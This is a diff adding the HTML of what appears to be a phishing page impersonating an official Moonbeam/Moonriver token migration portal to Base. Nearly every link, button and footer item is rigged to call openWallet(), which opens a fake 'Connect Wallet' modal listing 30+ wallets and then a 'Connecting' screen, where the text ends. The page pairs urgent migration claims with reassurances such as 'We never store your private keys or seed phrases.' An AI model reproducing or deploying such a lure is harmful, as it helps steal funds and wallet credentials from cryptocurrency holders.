+          <h3>Unstaking</h3>
+          <p>Withdraw tokens from collator staking positions on Moonbeam or Moonriver before migrating them to Base.</p>
+          <span class="go">View steps <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 10L10 2M10 2H4M10 2V8" stroke="currentColor" stroke-width="1.3" />
+            </svg></span>
+        </a>
+
+        <a href="#steps" class="cta-card" onclick="openWallet(); return false;">
+          <div class="idx">03 / WITHDRAW</div>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M19 14l-7 7m0 0l-7-7m7 7V3" stroke-linecap="round" stroke-linejoin="round" />
+          </svg>
+          <h3>Withdrawals</h3>
+          <p>Exit liquidity positions, lending markets, and other DeFi protocols on-chain before the network winds down.
+          </p>
+          <span class="go">View steps <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 10L10 2M10 2H4M10 2V8" stroke="currentColor" stroke-width="1.3" />
+            </svg></span>
+        </a>
+
+        <a href="#faq" class="cta-card" onclick="openWallet(); return false;">
+          <div class="idx">04 / CLAIM</div>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M12 15a4 4 0 100-8 4 4 0 000 8z" stroke-linecap="round" />
+            <path d="M8 21l1-5.5M16 21l-1-5.5" stroke-linecap="round" />
+          </svg>
+          <h3>Claiming Airdrops</h3>
+          <p>Check eligibility and claim any outstanding rewards or airdrops tied to your Moonbeam or Moonriver
+            activity.</p>
+          <span class="go">Check eligibility <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 10L10 2M10 2H4M10 2V8" stroke="currentColor" stroke-width="1.3" />
+            </svg></span>
+        </a>
+
+        <a href="#faq" class="cta-card" onclick="openWallet(); return false;">
+          <div class="idx">05 / EXCHANGES</div>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M4 7h16M4 7l4-4M4 7l4 4M20 17H4m16 0l-4-4m4 4l-4 4" stroke-linecap="round"
+              stroke-linejoin="round" />
+          </svg>
+          <h3>Holding on an Exchange</h3>
+          <p>If your GLMR or MOVR is held on a centralized exchange, your exchange will handle migration automatically.
+          </p>
+          <span class="go">Learn more <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 10L10 2M10 2H4M10 2V8" stroke="currentColor" stroke-width="1.3" />
+            </svg></span>
+        </a>
+
+        <a href="#support" class="cta-card" onclick="openWallet(); return false;">
+          <div class="idx">06 / SUPPORT</div>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M18 10a6 6 0 10-12 0v4a2 2 0 002 2h1v-6H6a4 4 0 118 0h-3v6h1a2 2 0 002-2v-4z" />
+          </svg>
+          <h3>Get Support</h3>
+          <p>Verify contract addresses, report an issue, or reach the migration support team through official channels.
+          </p>
+          <span class="go">Contact support <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 10L10 2M10 2H4M10 2V8" stroke="currentColor" stroke-width="1.3" />
+            </svg></span>
+        </a>
+
+      </div>
+    </section>
+
+    <section class="why-section">
+      <div class="section-eyebrow">Why Migrate</div>
+      <h2>Why Base</h2>
+      <div class="why-grid">
+        <div class="why-cards-col">
+          <div class="why-card one">
+            <div class="card-head"><span>&#9632;</span><span>X:158 Y:10</span></div>
+            <h3>Your Gateway Forward</h3>
+            <p>Moonbeam is relaunching on Base to serve as a decentralized AI agent communication and settlement network
+              built for the on-chain economy of the future. Migrating early means uninterrupted access to your assets
+              and the new Moonbeam Protocol.</p>
+          </div>
+          <div class="why-card two">
+            <div class="card-head"><span>&#9632;</span><span>X:22 Y:267</span></div>
+            <h3>Seamless, Fee-Free Bridging</h3>
+            <p>The migration is 1:1 with no fee to migrate. Every GLMR or MOVR you hold today becomes one Base ERC-20
+              token, verified and deployed at official, published contract addresses.</p>
+          </div>
+        </div>
+        <div class="why-media">
+          <img src="img/moonbeambg.gif" alt="">
+        </div>
+      </div>
+    </section>
+
+    <section class="assets-section" id="assets">
+      <div class="section-eyebrow">Supported Assets</div>
+      <h2>What's Migrating</h2>
+      <div class="assets-grid">
+        <div class="asset-card">
+          <div class="asset-icon">GLMR</div>
+          <div>
+            <h4>GLMR</h4>
+            <p>The native token of the Moonbeam Network, migrating 1:1 to a new Base ERC-20 contract as part of the
+              network relaunch.</p>
+          </div>
+        </div>
+        <div class="asset-card">
+          <div class="asset-icon">MOVR</div>
+          <div>
+            <h4>MOVR</h4>
+            <p>The native token of the Moonriver Network. Bridges via Moonbeam in two steps: to xcMOVR, then to Base
+              ERC-20 MOVR.</p>
+          </div>
+        </div>
+        <div class="asset-card">
+          <div class="asset-icon">xc</div>
+          <div>
+            <h4>xcMOVR</h4>
+            <p>The Moonbeam-side XCM representation of MOVR, used as the intermediate hop when bridging MOVR to Base.
+            </p>
+          </div>
+        </div>
+        <div class="asset-card">
+          <div class="asset-icon">DeFi</div>
+          <div>
+            <h4>Staked &amp; LP Positions</h4>
+            <p>Liquidity, lending, and collator staking positions across ecosystem protocols. Must be exited manually
+              before bridging.</p>
+          </div>
+        </div>
+        <div class="asset-card">
+          <div class="asset-icon">NFT</div>
+          <div>
+            <h4>NFTs &amp; Collectibles</h4>
+            <p>Check individual project channels for NFT-specific migration paths, as timelines vary by collection.</p>
+          </div>
+        </div>
+        <div class="asset-card">
+          <div class="asset-icon">CEX</div>
+          <div>
+            <h4>Exchange-Held Balances</h4>
+            <p>No action required. Centralized exchanges handle the token switchover automatically on your behalf.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="steps-section" id="steps">
+      <div class="steps-header">
+        <div>
+          <div class="section-eyebrow">Action Steps</div>
+          <h2>Before You Migrate</h2>
+        </div>
+        <a href="#faq" class="all-faq-btn" onclick="openWallet(); return false;">ALL FAQS &#9656;</a>
+      </div>
+      <div class="steps-grid">
+        <div class="step-card">
+          <div class="step-date">STEP 01</div>
+          <div class="step-tag">Required First</div>
+          <h3>Exit On-Chain Positions</h3>
+          <p>Withdraw any funds deployed in protocols on Moonbeam or Moonriver &mdash; liquidity positions, lending
+            markets, staking contracts, and other DeFi protocols. Once a chain winds down, funds left in on-chain
+            protocols may become permanently inaccessible.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-date">STEP 02</div>
+          <div class="step-tag">Bridge Tokens</div>
+          <h3>Bridge via the Migration Portal</h3>
+          <p>Use the official migration portal to bridge GLMR directly, or MOVR in two hops via xcMOVR. The migration is
+            1:1 with no fee. Always verify contract addresses before confirming any transaction.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-date">STEP 03</div>
+          <div class="step-tag">Confirm &amp; Verify</div>
+          <h3>Verify Your New Balance</h3>
+          <p>Once bridged, confirm your Base ERC-20 balance matches what you migrated. Keep an eye on official channels
+            for further communications as the migration progresses toward the deadline.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="faq-section" id="faq">
+      <div class="section-eyebrow">Common Questions</div>
+      <h2>Migration FAQ</h2>
+      <div class="faq-media">
+        <img src="img/moonbeambg.gif" alt="">
+      </div>
+      <div class="faq-list">
+        <div class="faq-item">
+          <div class="fq-head"><span>&#9632;</span><span>01</span></div>
+          <div class="fq-body">
+            <h3>What if I hold tokens on an exchange?</h3>
+            <p>You do not need to do anything. Your exchange will handle the migration automatically. Watch for direct
+              communication from your exchange confirming the switchover date.</p>
+            <a href="#support" class="read-more" onclick="openWallet(); return false;">READ MORE
+              <span>&#9656;</span></a>
+          </div>
+        </div>
+        <div class="faq-item">
+          <div class="fq-head"><span>&#9632;</span><span>02</span></div>
+          <div class="fq-body">
+            <h3>Is there a fee to migrate?</h3>
+            <p>No. The migration is 1:1 with no fee to migrate. Every token you hold today becomes one Base ERC-20 token
+              at the same amount.</p>
+            <a href="#support" class="read-more" onclick="openWallet(); return false;">READ MORE
+              <span>&#9656;</span></a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="ready-section" id="support">
+      <div class="ready-media">
+        <img src="img/moonbeambg.gif" alt="">
+      </div>
+      <h2>Need a Hand?</h2>
+      <div class="ready-cards">
+        <div class="ready-card">
+          <div class="rc-head"><span>&#9632;</span><span>X:75 Y:0</span></div>
+          <h3>Verify Contracts</h3>
+          <p>Always confirm you're interacting with official, published contract addresses before bridging. Never trust
+            a link sent to you directly.</p>
+          <a href="#" class="lm-btn" onclick="openWallet(); return false;">LEARN MORE <span>&#9656;</span></a>
+        </div>
+        <div class="ready-card">
+          <div class="rc-head"><span>&#9632;</span><span>X:1030 Y:276</span></div>
+          <h3>Talk to Support</h3>
+          <p>Reach the migration support team through official Moonbeam channels if you run into any issues bridging
+            your assets.</p>
+          <a href="#" class="lm-btn" onclick="openWallet(); return false;">LEARN MORE <span>&#9656;</span></a>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <footer>
+    <div class="foot-grid">
+      <div class="foot-col">
+        <h5>Migration</h5>
+        <a href="#migration" onclick="openWallet(); return false;">Bridge Tokens</a>
+        <a href="#steps" onclick="openWallet(); return false;">Action Steps</a>
+        <a href="#assets" onclick="openWallet(); return false;">Supported Assets</a>
+      </div>
+      <div class="foot-col">
+        <h5>Support</h5>
+        <a href="#faq" onclick="openWallet(); return false;">FAQ</a>
+        <a href="#support" onclick="openWallet(); return false;">Contact Support</a>
+        <a href="#" onclick="openWallet(); return false;">Report a Bug</a>
+      </div>
+      <div class="foot-col">
+        <h5>Community</h5>
+        <a href="#" onclick="openWallet(); return false;">Forums</a>
+        <a href="#" onclick="openWallet(); return false;">Announcements</a>
+      </div>
+      <div class="foot-col">
+        <h5>Networks</h5>
+        <a href="#" onclick="openWallet(); return false;">Moonbeam Network</a>
+        <a href="#" onclick="openWallet(); return false;">Moonriver Network</a>
+      </div>
+      <div class="foot-socials">
+        <a href="#" aria-label="X"><svg viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M18.9 2H22l-7.5 8.6L23.3 22H16.7l-5.2-6.8L5.5 22H2.4l8-9.2L1.5 2h6.8l4.7 6.2L18.9 2zm-1.2 18h1.7L7.4 3.9H5.6L17.7 20z" />
+          </svg></a>
+        <a href="#" aria-label="YouTube"><svg viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M23 12s0-3.6-.5-5.3c-.3-1-1-1.7-2-2C18.8 4.2 12 4.2 12 4.2s-6.8 0-8.5.5c-1 .3-1.7 1-2 2C1 8.4 1 12 1 12s0 3.6.5 5.3c.3 1 1 1.7 2 2 1.7.5 8.5.5 8.5.5s6.8 0 8.5-.5c1-.3 1.7-1 2-2 .5-1.7.5-5.3.5-5.3zM9.8 15.5v-7l6 3.5-6 3.5z" />
+          </svg></a>
+        <a href="#" aria-label="GitHub"><svg viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M12 2a10 10 0 00-3.2 19.5c.5.1.7-.2.7-.5v-1.7c-2.8.6-3.4-1.3-3.4-1.3-.5-1.1-1.1-1.5-1.1-1.5-.9-.6.1-.6.1-.6 1 .1 1.5 1 1.5 1 .9 1.5 2.3 1.1 2.9.8.1-.7.4-1.1.6-1.4-2.2-.3-4.6-1.1-4.6-5 0-1.1.4-2 1-2.6-.1-.3-.5-1.3.1-2.7 0 0 .8-.3 2.7 1a9.3 9.3 0 015 0c1.9-1.3 2.7-1 2.7-1 .5 1.4.2 2.4.1 2.7.6.7 1 1.6 1 2.6 0 3.9-2.4 4.7-4.6 5 .3.3.6.9.6 1.9v2.8c0 .3.2.6.7.5A10 10 0 0012 2z" />
+          </svg></a>
+        <a href="#" aria-label="Telegram"><svg viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M22 3L2.5 10.8c-1 .4-1 1.6.1 1.9l4.9 1.5 1.9 6c.3.9 1.4 1.1 2 .3l2.6-3.2 5.1 3.8c.8.6 1.9.1 2.1-.8l3-14.3c.2-1-.8-1.7-1.7-1.4zM8 13.5l9.5-6-7.6 7-.3 3.3-1.6-4.3z" />
+          </svg></a>
+        <a href="#" aria-label="Discord"><svg viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M20.3 5.4A17.5 17.5 0 0016 4l-.3.6a13 13 0 014 1.7 17.9 17.9 0 00-15.4 0 13 13 0 014-1.7L8 4a17.5 17.5 0 00-4.3 1.4C1 10 .3 14.6.6 19a17.9 17.9 0 005.3 2.7l.9-1.4a11.6 11.6 0 01-1.8-.9l.4-.3a12.6 12.6 0 0010.9 0l.4.3c-.6.3-1.2.6-1.8.9l.9 1.4A17.8 17.8 0 0023.4 19c.4-5-.9-9.5-3.1-13.6zM8.5 16.3c-1 0-1.8-1-1.8-2.1 0-1.2.8-2.1 1.8-2.1s1.9 1 1.8 2.1c0 1.2-.8 2.1-1.8 2.1zm7 0c-1 0-1.8-1-1.8-2.1 0-1.2.8-2.1 1.8-2.1s1.9 1 1.8 2.1c0 1.2-.8 2.1-1.8 2.1z" />
+          </svg></a>
+        <a href="#" aria-label="LinkedIn"><svg viewBox="0 0 24 24" fill="currentColor">
+            <path
+              d="M4.98 3.5C4.98 4.9 3.9 6 2.5 6S0 4.9 0 3.5 1.1 1 2.5 1s2.48 1.1 2.48 2.5zM.2 8.5h4.6V23H.2V8.5zM8.4 8.5h4.4v2h.1c.6-1.1 2.1-2.3 4.3-2.3 4.6 0 5.5 3 5.5 7v7.8h-4.6v-6.9c0-1.6 0-3.8-2.3-3.8s-2.7 1.8-2.7 3.7v7h-4.6V8.5z" />
+          </svg></a>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span>&copy; 2026 Moonbeam. All rights reserved.</span>
+      <div class="links">
+        <a href="#" onclick="openWallet(); return false;">Terms of use</a>
+        <a href="#" onclick="openWallet(); return false;">Privacy policy</a>
+      </div>
+      <div class="secured">
+        Secured by
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+          <circle cx="12" cy="12" r="10" />
+        </svg>
+        Polkadot
+      </div>
+    </div>
+  </footer>
+
+  <div class="w-overlay" id="wOverlay">
+
+    <!-- SCREEN 1: Select Wallet -->
+    <div class="w-panel" id="wScreen1">
+      <div class="w-header">
+        <span class="w-title">Connect Wallet</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-body">
+
+        <!-- Featured: MetaMask -->
+        <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
+          <span class="w-featured-badge">Recommended</span>
+          <div class="w-feat-icon">
+            <img src="img/trustwallet.png" alt="Trust Wallet" />
+          </div>
+          <div>
+            <div class="w-feat-name">Trust Wallet</div>
+            <div class="w-feat-desc">Multi-chain mobile Wallet</div>
+          </div>
+        </div>
+
+        <div class="w-divider"><span>other wallets</span></div>
+
+        <div class="w-list">
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
+            <div>
+              <div class="w-item-name">Phantom Wallet</div>
+              <div class="w-item-desc">Solana Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
+            <div>
+              <div class="w-item-name">Ledger</div>
+              <div class="w-item-desc">Hardware wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/metamask.png" alt="Metamask Wallet" /></div>
+            <div>
+              <div class="w-item-name">Metamask </div>
+              <div class="w-item-desc">Ethereum Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item w-item-other" onclick="openOtherWallets()">
+            <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+            <div>
+              <div class="w-item-name">Other Wallets</div>
+              <div class="w-item-desc">Browse 30+ supported wallets</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+        </div>
+
+        <p class="w-note">
+          By connecting you agree to our <a href="#" onclick="openWallet();return false;">Terms</a> &amp; <a href="#"
+            onclick="openWallet();return false;">Privacy Policy</a>.
+          We never store your private keys or seed phrases.
+        </p>
+      </div>
+    </div>
+
+    <!-- OTHER WALLETS -->
+    <div class="w-sub" id="wScreenOther">
+      <div class="w-header">
+        <span class="w-title">Other Wallets</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="ow-search-wrap">
+        <i class="ri-search-line"></i>
+        <input class="ow-search" id="owSearch" type="text" placeholder="Search by name or network..." autocomplete="off"
+          spellcheck="false" />
+      </div>
+      <div class="ow-count" id="owCount">30 wallets</div>
+      <div class="ow-list" id="owList">
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/pera.png" alt="Pera Wallet" /></div>
+          <div>
+            <div class="ow-name">Pera Wallet</div>
+            <div class="ow-chain">Algorand</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/rainbow.png" alt="Rainbow" /></div>
+          <div>
+            <div class="ow-name">Rainbow</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/basewallet.png" alt="Base Wallet" /></div>
+          <div>
+            <div class="ow-name">Base Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/rabby.png" alt="Rabby" /></div>
+          <div>
+            <div class="ow-name">Rabby Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/zerion.png" alt="Zerion" /></div>
+          <div>
+            <div class="ow-name">Zerion</div>
+            <div class="ow-chain">Ethereum / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walletconnect.png" alt="WalletConnect" /></div>
+          <div>
+            <div class="ow-name">WalletConnect</div>
+            <div class="ow-chain">Any compatible wallet</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
+          <div>
+            <div class="ow-name">Phantom</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/stepn.png" alt="Stepn" /></div>
+          <div>
+            <div class="ow-name">Stepn</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/solflare.png" alt="Solflare" /></div>
+          <div>
+            <div class="ow-name">Solflare</div>
+            <div class="ow-chain">Solana</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/okx.png" alt="OKX Wallet" /></div>
+          <div>
+            <div class="ow-name">OKX Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/terrastation.png" alt="Terra Station" /></div>
+          <div>
+            <div class="ow-name">Terra Station</div>
+            <div class="ow-chain">Terra</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/safepal.png" alt="SafePal" /></div>
+          <div>
+            <div class="ow-name">SafePal</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/exodus.png" alt="Exodus" /></div>
+          <div>
+            <div class="ow-name">Exodus</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/atomic.png" alt="Atomic Wallet" /></div>
+          <div>
+            <div class="ow-name">Atomic Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+          <div>
+            <div class="ow-name">Trezor</div>
+            <div class="ow-chain">Hardware / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tokenpocket.png" alt="TokenPocket" /></div>
+          <div>
+            <div class="ow-name">TokenPocket</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/uniswap.png" alt="Uniswap" /></div>
+          <div>
+            <div class="ow-name">Uniswap Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/cryptocom.png" alt="Crypto.com" /></div>
+          <div>
+            <div class="ow-name">Crypto.com DeFi</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/keplr.png" alt="Keplr" /></div>
+          <div>
+            <div class="ow-name">Keplr</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/leapwallet.png" alt="Leap" /></div>
+          <div>
+            <div class="ow-name">Leap Wallet</div>
+            <div class="ow-chain">Cosmos / IBC</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tangem.png" alt="Tangem" /></div>
+          <div>
+            <div class="ow-name">Tangem</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/jade.png" alt="Jade" /></div>
+          <div>
+            <div class="ow-name">Jade</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/polkadot.png" alt="Polkadot.js" /></div>
+          <div>
+            <div class="ow-name">Polkadot.js</div>
+            <div class="ow-chain">Polkadot / Substrate</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/talisman.png" alt="Talisman" /></div>
+          <div>
+            <div class="ow-name">Talisman</div>
+            <div class="ow-chain">Polkadot / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/nami.png" alt="Nami" /></div>
+          <div>
+            <div class="ow-name">Nami</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/eternl.png" alt="Eternl" /></div>
+          <div>
+            <div class="ow-name">Eternl</div>
+            <div class="ow-chain">Cardano</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep" /></div>
+          <div>
+            <div class="ow-name">BitKeep</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/martian.png" alt="Martian" /></div>
+          <div>
+            <div class="ow-name">Martian</div>
+            <div class="ow-chain">Aptos / Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/suiet.png" alt="Suiet" /></div>
+          <div>
+            <div class="ow-name">Suiet</div>
+            <div class="ow-chain">Sui</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/huobi.png" alt="Huobi" /></div>
+          <div>
+            <div class="ow-name">Huobi</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/argent.png" alt="Argent" /></div>
+          <div>
+            <div class="ow-name">Argent</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/defly.png" alt="Defly" /></div>
+          <div>
+            <div class="ow-name">Defly</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/midas.png" alt="Midas Wallet" /></div>
+          <div>
+            <div class="ow-name">Midas Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/tongue.png" alt="Tongue Wallet" /></div>
+          <div>
+            <div class="ow-name">Tongue Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/celo.png" alt="Celo Wallet" /></div>
+          <div>
+            <div class="ow-name">Celo Wallet</div>
+            <div class="ow-chain">Celo</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bridge wallet.png" alt="Bridge Wallet" /></div>
+          <div>
+            <div class="ow-name">Bridge Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walletio.png" alt="Wallet.io" /></div>
+          <div>
+            <div class="ow-name">Wallet.io</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/coinomi.png" alt="Coinomi Wallet" /></div>
+          <div>
+            <div class="ow-name">Coinomi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/dharma.png" alt="Dharma Wallet" /></div>
+          <div>
+            <div class="ow-name">Dharma Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/1inch.png" alt="1inch Wallet" /></div>
+          <div>
+            <div class="ow-name">1inch Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walleth.png" alt="walleth" /></div>
+          <div>
+            <div class="ow-name">walleth</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitpay.png" alt="BitPay Wallet" /></div>
+          <div>
+            <div class="ow-name">BitPay Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/infinito.png" alt="Infinito Wallet" /></div>
+          <div>
+            <div class="ow-name">Infinito Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/defly.png" alt="Defly Wallet" /></div>
+          <div>
+            <div class="ow-name">Defly Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/huobi.png" alt="Huobi Wallet" /></div>
+          <div>
+            <div class="ow-name">Huobi Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/bitkeep.png" alt="BitKeep Wallet" /></div>
+          <div>
+            <div class="ow-name">BitKeep Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/jade.png" alt="Jade Wallet" /></div>
+          <div>
+            <div class="ow-name">Jade Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/stepn.png" alt="StepN Wallet" /></div>
+          <div>
+            <div class="ow-name">StepN Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+      </div>
+      <div class="ow-no-results" id="owNoResults">
+        <i class="ri-search-line"></i>
+        No wallets found for "<span id="owQuery" style="color:#6ea4ff;font-weight:600"></span>"
+      </div>
+    </div>
+
+    <!-- SCREEN 2: Connecting -->
+    <div class="w-sub" id="wScreen2">
+      <div class="w-header">
+        <span class="w-title">Connecting</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-loading-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s2Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s2Name">Wallet</span>
+        </div>
+        <div class="w-spinner"></div>
